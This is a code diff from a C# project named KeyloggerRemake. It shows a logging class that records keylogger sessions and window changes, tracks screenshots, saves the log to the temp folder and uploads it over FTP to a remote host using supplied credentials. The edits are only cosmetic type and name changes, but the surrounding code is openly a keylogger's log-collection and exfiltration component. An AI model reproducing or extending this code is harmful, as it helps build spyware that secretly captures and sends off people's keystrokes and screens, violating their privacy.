@@ -7,8 +7,8 @@ namespace KeyloggerRemake
 {
     public class classLog
     {
-        public String strLog;
-        private String strUserInfo;
+        public string strLog;
+        private string strUserInfo;
         private String strLogStartDateTime;
         public String strLogEndDateTime;
         private String strLogShortDateTime;
@@ -21,13 +21,13 @@ namespace KeyloggerRemake
             strLogStartDateTime = classGetUserInfo.getDateAndTime();
         }
 
-        public String addToLog(String strInfo)
+        public string addToLog(String strInfo)
         {
             strLog += strInfo;
             return strInfo;
         }
 
-        public String printStartedLog()
+        public string printStartedLog()
         {
             return ("---------------------------------------------------------------------------------" + Environment.NewLine
                  + "KeyLogger started at: " + strLogStartDateTime
@@ -35,7 +35,7 @@ namespace KeyloggerRemake
                  + "---------------------------------------------------------------------------------" + Environment.NewLine);
         }
 
-        public String printStoppedLog()
+        public string printStoppedLog()
         {
             strLogEndDateTime = classGetUserInfo.getDateAndTime();
 
@@ -46,7 +46,7 @@ namespace KeyloggerRemake
                  + "---------------------------------------------------------------------------------" + Environment.NewLine);
         }
 
-        public String printNewWindow()
+        public string printNewWindow()
         {
             strLogShortDateTime = classGetUserInfo.getShortDTime();
 
@@ -56,12 +56,12 @@ namespace KeyloggerRemake
                  + "----------------------------------------------------------------------------" + Environment.NewLine);
         }
 
-        public void saveLog(String strHost, String strUser, String strPass)
+        public void saveLog(string strHost, string strUser, string strPass)
         {
             strLogShortDateTime = classGetUserInfo.getShortDTime();
 
-            String strLogName = "\\Log " + strLogShortDateTime + ".txt";
-            String strLogFile = Path.GetTempPath() + strLogName;
+            string strLogName = "\\Log " + strLogShortDateTime + ".txt";
+            string strLogFile = Path.GetTempPath() + strLogName;
 
             using (StreamWriter swWriter = new StreamWriter(strLogFile))
             {
@@ -71,7 +71,7 @@ namespace KeyloggerRemake
             classFTP.uploadLog(strHost, strUser, strPass, strLogName, strLogFile);
         }
         
-        public bool checkScreenshots(String strScreenshotName)
+        public bool screenshotExists(string strScreenshotName)
         {
             bool blScreenshotExists = stkScreenshots.Any(s => s.strScreenshotName == strScreenshotName);
 
